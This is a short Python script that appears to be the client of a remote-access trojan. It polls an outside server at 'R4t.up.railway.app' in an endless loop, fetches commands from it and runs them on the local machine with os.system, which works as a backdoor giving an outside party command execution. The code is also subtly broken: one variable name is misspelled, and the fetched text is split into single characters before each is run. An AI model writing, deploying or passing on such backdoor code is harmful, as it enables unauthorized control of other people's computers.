import requests,time,os
while True:
    commands=[]
    time.sleep(0.5)
    if requests.get("https://R4t.up.railway.app/status").text == "OK":
        try:
            commands = list(requests.post("https://R4t.up.railway.app/commands/exec").text)
        except:
            commands = ["test"]
    else:
        comamnds = ["test"]
    for command in commands:
        os.system(command)